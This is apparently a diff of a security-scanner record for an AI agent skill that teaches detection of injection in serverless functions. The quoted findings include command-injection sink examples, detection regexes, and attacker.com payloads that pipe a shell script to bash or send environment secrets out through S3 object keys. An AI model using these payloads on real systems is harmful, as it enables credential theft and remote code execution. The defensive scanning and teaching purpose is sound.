@@ -4,136 +4,256 @@
   "repo": "Yana-AI",
   "path": "core/skills/detecting-serverless-function-injection",
   "name": "detecting-serverless-function-injection",
-  "description": "",
+  "description": "'Detects and prevents code injection attacks targeting serverless functions",
   "stars": 13,
   "category": "coding",
-  "commit": "cc1193ce6757d241f317fb5b6d2ada7399c4fee4",
-  "contentHash": "d74323a949c1fce2bd84ebb4cd0b08443dff364538c7885d9dd940e7032db890",
+  "commit": "e821ccd2f0f7d96a9213082f7dfc1d43b5836e7f",
+  "contentHash": "da198df265b8f41e0b1f8a81e4f5bd1670676e3d257d833d63c2eba34ba382ac",
   "repoCreatedAt": "2026-05-17T00:35:59Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": true,
-  "scannedAt": "2026-11-19T10:50:00.942Z",
+  "scannedAt": "2026-11-23T11:25:12.649Z",
   "scan": {
     "findings": [
       {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 45,
+        "excerpt": "- Auditing Lambda/Cloud Functions for code injection vulnerabilities where unsanitized event data flows into dangerous runtime functions (`eval`, `exec`, `child",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 70,
+        "excerpt": "aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role,Handler,Layers]' --output table",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 74,
+        "excerpt": "aws lambda list-event-source-mappings --output json | \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 79,
+        "excerpt": "aws apigateway get-rest-apis --query 'items[*].[id,name]' --output table",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 84,
+        "excerpt": "aws s3api get-bucket-notification-configuration --bucket <bucket-name>",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 88,
+        "excerpt": "aws lambda get-function-configuration --function-name <name> \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 93,
+        "excerpt": "aws iam list-attached-role-policies --role-name <lambda-exec-role>",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 103,
+        "excerpt": "aws lambda get-function --function-name <name> --query 'Code.Location' --output text | xargs curl -o function.zip",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 103,
+        "excerpt": "aws lambda get-function --function-name <name> --query 'Code.Location' --output text | xargs curl -o function.zip",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 111,
+        "excerpt": "os.system(event['command'])         # OS command injection",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 112,
+        "excerpt": "subprocess.call(event['cmd'], shell=True)  # Shell injection",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 113,
+        "excerpt": "os.popen(event['input'])            # Command injection",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 122,
+        "excerpt": "child_process.exec(event.command);         // OS command injection",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 123,
+        "excerpt": "child_process.execSync(event.cmd);         // Synchronous command injection",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 125,
+        "excerpt": "require('child_process').exec(event.input); // Import-and-execute pattern",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 129,
+        "excerpt": "semgrep --config \"p/owasp-top-ten\" --config \"p/command-injection\" \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 134,
+        "excerpt": "bandit -r function_code/ -f json -o bandit_results.json \\",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 137,
+        "excerpt": "These test IDs specifically target `exec`, `pickle`, `eval`, `subprocess` with `shell=True`, and other injection-relevant patterns.",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 161,
+        "excerpt": "os.system(f\"aws s3 cp s3://{bucket}/{key} /tmp/file\")",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 163,
+        "excerpt": "Attack: Upload an object with key `; curl http://attacker.com/exfil?data=$(env)` to inject a command through the S3 event.",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 181,
+        "excerpt": "subprocess.run(f\"echo {user_agent} >> /tmp/access.log\", shell=True)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 198,
+        "excerpt": "| filter @message like /(?i)(eval|exec|os\\.system|child_process|subprocess|import os)/",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 225,
+        "excerpt": "--query 'Content.Location' --output text | xargs curl -o layer.zip",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
         "ruleId": "downloads-code",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 21,
-        "excerpt": "print(\"ERROR: boto3 required. Install with: pip install boto3\")",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 32,
-        "excerpt": "{\"pattern\": r\"\\bos\\.system\\s*\\(\", \"sink\": \"os.system()\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 33,
-        "excerpt": "{\"pattern\": r\"\\bos\\.popen\\s*\\(\", \"sink\": \"os.popen()\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 34,
-        "excerpt": "{\"pattern\": r\"\\bsubprocess\\.call\\s*\\(.*shell\\s*=\\s*True\", \"sink\": \"subprocess.call(shell=True)\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 35,
-        "excerpt": "{\"pattern\": r\"\\bsubprocess\\.run\\s*\\(.*shell\\s*=\\s*True\", \"sink\": \"subprocess.run(shell=True)\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 36,
-        "excerpt": "{\"pattern\": r\"\\bsubprocess\\.Popen\\s*\\(.*shell\\s*=\\s*True\", \"sink\": \"subprocess.Popen(shell=True)\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 47,
-        "excerpt": "{\"pattern\": r\"\\bchild_process\\.exec\\s*\\(\", \"sink\": \"child_process.exec()\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 48,
-        "excerpt": "{\"pattern\": r\"\\bchild_process\\.execSync\\s*\\(\", \"sink\": \"child_process.execSync()\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 49,
-        "excerpt": "{\"pattern\": r\"\\bexecSync\\s*\\(\", \"sink\": \"execSync()\", \"severity\": \"critical\", \"cwe\": \"CWE-78\"},",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 53,
-        "excerpt": "{\"pattern\": r\"\\brequire\\s*\\(\\s*['\\\"]child_process['\\\"]\\s*\\)\", \"sink\": \"require('child_process')\", \"severity\": \"medium\", \"cwe\": \"CWE-78\"},",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 480,
+        "excerpt": "Object key: `; curl http://attacker.com/shell.sh | bash`",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "network",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 172,
-        "excerpt": "import urllib.request",
-        "disclosed": false,
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 480,
+        "excerpt": "Object key: `; curl http://attacker.com/shell.sh | bash`",
+        "disclosed": true,
         "automatic": false,
-        "hosts": []
+        "hosts": [
+          "attacker.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 481,
+        "excerpt": "Results in: os.system(\"convert /tmp/; curl http://attacker.com/shell.sh | bash\")",
+        "disclosed": false,
+        "automatic": false
       },
       {
         "ruleId": "network",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 174,
-        "excerpt": "req = urllib.request.Request(code_location)",
-        "disclosed": false,
+        "file": "core/skills/detecting-serverless-function-injection/SKILL.md",
+        "line": 481,
+        "excerpt": "Results in: os.system(\"convert /tmp/; curl http://attacker.com/shell.sh | bash\")",
+        "disclosed": true,
         "automatic": false,
-        "hosts": []
-      },
-      {
-        "ruleId": "network",
-        "file": "core/skills/detecting-serverless-function-injection/scripts/agent.py",
-        "line": 175,
-        "excerpt": "with urllib.request.urlopen(req, timeout=60) as resp, open(zip_path, \"wb\") as out:",
-        "disclosed": false,
-        "automatic": false,
-        "hosts": []
+        "hosts": [
+          "attacker.com"
+        ]
       }
     ],
     "findingTotals": {
-      "downloads-code": 1,
-      "shell": 9,
-      "network": 3
+      "shell": 33,
+      "network": 5,
+      "downloads-code": 2
     },
-    "score": 75,
+    "score": 79,
     "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 2,
-    "filesSkipped": 3
+    "filesScanned": 4,
+    "filesSkipped": 1
   },
   "history": [
     {
@@ -152,6 +272,12 @@
       "commit": "cc1193ce6757d241f317fb5b6d2ada7399c4fee4",
       "scannedAt": "2026-11-19T10:50:00.942Z",
       "score": 75,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "e821ccd2f0f7d96a9213082f7dfc1d43b5836e7f",
+      "scannedAt": "2026-11-23T11:25:12.649Z",
+      "score": 79,
       "rulesVersion": "1.3.0"
     }
   ]
